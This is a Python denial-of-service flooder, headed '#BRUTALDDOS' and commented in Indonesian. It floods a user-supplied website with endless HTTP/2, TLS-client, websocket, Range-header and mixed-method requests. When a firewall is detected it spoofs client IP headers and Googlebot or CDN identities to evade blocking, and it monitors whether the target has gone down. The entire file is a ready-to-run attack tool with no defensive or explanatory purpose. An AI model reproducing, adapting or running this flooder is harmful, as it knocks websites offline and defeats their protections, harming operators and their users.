
#BRUTALDDOS

import requests, httpx, threading, random, string, time, socket, os, ssl, re
from tls_client import Session
from websocket import create_connection
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor
from threading import Lock, Thread

# === KONFIGURASI DASAR ===
TARGET_URL = input("🔗 URL Target (https://example.com): ").strip().rstrip("/")
MAX_THREADS = int(input("🧵 Jumlah Threads: "))
ENABLE_VIEW = input("👁️ Aktifkan Spam View? (y/n): ").strip().lower() == 'y'

parsed = urlparse(TARGET_URL)
TARGET_DOMAIN = parsed.hostname
TARGET_IP = socket.gethostbyname(TARGET_DOMAIN)
TARGET_PORT = 443 if parsed.scheme == 'https' else 80
print(f"✅ Target IP: {TARGET_IP}:{TARGET_PORT}")

# === VARIABEL GLOBAL ===
sukses = gagal = view_sent = l4_sent = slow_conn = total_req = 0
last_status_code = 0
target_status = "🟢 OKE"
spoof_mode = False
lock = Lock()

# 💣 USER AGENT LOADER OTOMATIS
USER_AGENTS = []
ua_file = "10k-user-agent.txt"

if not os.path.exists(ua_file):
    print("📥 File User-Agent belum ada, download otomatis...")
    try:
        import urllib.request
        urllib.request.urlretrieve(
            "https://raw.githubusercontent.com/Rizz9/10k-user-agent/main/10k-user-agent.txt", ua_file
        )
        print("✅ Berhasil download 10k-user-agent.txt")
    except Exception as e:
        print(f"❌ Gagal download user-agent: {e}")
        USER_AGENTS = []

if os.path.exists(ua_file):
    with open(ua_file, "r") as f:
        USER_AGENTS = [ua.strip() for ua in f if ua.strip()]
    print(f"✅ Loaded {len(USER_AGENTS)} User-Agent")
else:
    print("⚠️ File 10k-user-agent.txt tidak ditemukan, pakai User-Agent default.")

# === UTILITAS ===
def kotak(text):
    lines = text.strip().split("\n")
    panjang = max(len(line) for line in lines)
    bar = "═" * (panjang + 4)
    box = [f"╔{bar}╗"]
    for line in lines:
        box.append(f"║  {line.ljust(panjang)}  ║")
    box.append(f"╚{bar}╝")
    return "\n".join(box)

def gen_data():
    base = ''.join(random.choices(string.ascii_letters + string.digits, k=1024))
    padding = ''.join(random.choices(string.printable, k=random.randint(256, 512)))
    return base + padding

def normal_headers():
    ua = random.choice(USER_AGENTS) if USER_AGENTS else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119"
    return {
        "User-Agent": ua,
        "Accept": "*/*",
        "Connection": "keep-alive"
    }

def spoofed_headers():
    ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
    ua = random.choice(USER_AGENTS) if USER_AGENTS else random.choice([
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
    ])
    return {
        "User-Agent": ua,
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "CF-Connecting-IP": ip,
        "Referer": f"https://google.com/search?q={random.randint(1111,9999)}",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }

def get_headers():
    return spoofed_headers() if spoof_mode else normal_headers()

# === WAF DETECTION ===
def detect_waf():
    global spoof_mode
    try:
        r = requests.get(f"{TARGET_URL}/?waf_check={random.randint(1111,9999)}", timeout=5)
        if r.status_code in [403, 405, 406]:
            spoof_mode = True
            print(f"🛡️ WAF terdeteksi ({r.status_code}) → Mengaktifkan header spoofing.")
        else:
            print(f"✅ Tidak terdeteksi WAF (Status: {r.status_code})")
    except:
        print("⚠️ Gagal cek WAF, lanjut default...")

# === VECTORS === (yang cocok di Cloud Shell)
def attack_http2():
    global last_status_code, sukses, gagal, total_req
    with httpx.Client(http2=True, timeout=5) as client:
        while True:
            try:
                url = f"{TARGET_URL}/?h2={random.randint(1000,9999)}"
                r = client.get(url, headers=get_headers())
                with lock:
                    last_status_code = r.status_code
                    sukses += 1
                    total_req += 1
            except:
                with lock:
                    gagal += 1
                    total_req += 1

def attack_tls_client():
    global last_status_code, sukses, gagal, total_req
    sess = Session(client_identifier="chrome_120")
    while True:
        try:
            sess.headers.update(get_headers())
            url = f"{TARGET_URL}/?tls={random.randint(1000,9999)}"
            r = sess.get(url, timeout=5)
            with lock:
                last_status_code = r.status_code
                sukses += 1
                total_req += 1
        except:
            with lock:
                gagal += 1
                total_req += 1

def attack_ws():
    global sukses, gagal, total_req
    try:
        ws = create_connection(TARGET_URL.replace("http", "ws"), timeout=5)
        while True:
            try:
                ws.send(gen_data())
                with lock:
                    sukses += 1
                    total_req += 1
            except:
                with lock:
                    gagal += 1
                    total_req += 1
                break
        ws.close()
    except:
        pass

def attack_l7_dual():
    global last_status_code, sukses, gagal, total_req
    while True:
        try:
            method = random.choice(["GET", "POST", "HEAD"])
            headers = get_headers()
            url = f"{TARGET_URL}/?dual={random.randint(1000,9999)}"
            if method == "POST":
                r = requests.post(url, headers=headers, data={"data": gen_data()}, timeout=5)
            else:
                r = requests.request(method, url, headers=headers, timeout=5)
            with lock:
                last_status_code = r.status_code
                sukses += 1
                total_req += 1
        except:
            with lock:
                gagal += 1
                total_req += 1

def attack_range_header():
    global sukses, gagal, total_req
    while True:
        try:
            headers = get_headers()
            headers["Range"] = f"bytes=0-{random.randint(100000,999999)}"
            url = f"{TARGET_URL}/?range={random.randint(1000,9999)}"
            r = requests.get(url, headers=headers, timeout=5)
            with lock:
                sukses += 1
                total_req += 1
        except:
            with lock:
                gagal += 1
                total_req += 1

def attack_fake_bot():
    global sukses, gagal, total_req
    while True:
        try:
            headers = get_headers()
            headers["User-Agent"] = "Googlebot/2.1 (+http://www.google.com/bot.html)"
            headers["Referer"] = "https://www.google.com/"
            url = f"{TARGET_URL}/?bot={random.randint(1000,9999)}"
            r = requests.get(url, headers=headers, timeout=5)
            with lock:
                sukses += 1
                total_req += 1
        except:
            with lock:
                gagal += 1
                total_req += 1

def attack_fake_cdn_referer():
    global sukses, gagal, total_req
    while True:
        try:
            headers = get_headers()
            headers["Referer"] = random.choice([
                "https://cdn.cloudflare.com/",
                "https://akamai.com/",
                "https://fastly.com/"
            ])
            url = f"{TARGET_URL}/?cdn={random.randint(1000,9999)}"
            r = requests.get(url, headers=headers, timeout=5)
            with lock:
                sukses += 1
                total_req += 1
        except:
            with lock:
                gagal += 1
                total_req += 1

def spam_view():
    global view_sent, total_req
    while True:
        try:
            url = f"{TARGET_URL}/?view={random.randint(100000,999999)}"
            r = requests.get(url, headers=get_headers(), timeout=5)
            with lock:
                view_sent += 1
                total_req += 1
        except:
            with lock:
                total_req += 1

def cek_target_status():
    global target_status
    try:
        r = requests.get(TARGET_URL, timeout=3)
        target_status = "🔴 DOWN" if r.status_code >= 500 else "🟢 OKE"
    except:
        target_status = "🔴 DOWN"

def monitor():
    global sukses, gagal, view_sent, total_req
    ps = pg = pv = 0
    while True:
        time.sleep(5)
        cek_target_status()
        with lock:
            ds = sukses - ps
            dg = gagal - pg
            dv = view_sent - pv
            ps, pg, pv = sukses, gagal, view_sent
            speed = (ds + dg) // 5
        if target_status == "🔴 DOWN":
            print("\n‼️ TARGET SAAT INI TUMBANG ‼️\n")
        print(kotak(f"""
📊 L7: ✅ Sukses: {sukses} ❌ Gagal: {gagal} 👁️ View: {view_sent} (+{dv})
📿 CODE: {last_status_code} ⚡️ SPEED: {speed}/s
🔌 PORT: {TARGET_PORT} 📈 Total Req: {total_req}
🛁 STATUS: {target_status}
"""))

def main():
    os.system("clear")
    print(kotak("🔥 RIZZDEV FLOODER 2025 FULL VECTOR"))
    detect_waf()
    Thread(target=monitor, daemon=True).start()
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
        for _ in range(MAX_THREADS):
            ex.submit(attack_http2)
            ex.submit(attack_tls_client)
            ex.submit(attack_ws)
            ex.submit(attack_l7_dual)
            ex.submit(attack_range_header)
            ex.submit(attack_fake_bot)
            ex.submit(attack_fake_cdn_referer)
            if ENABLE_VIEW:
                ex.submit(spam_view)

if __name__ == "__main__":
    main()
    
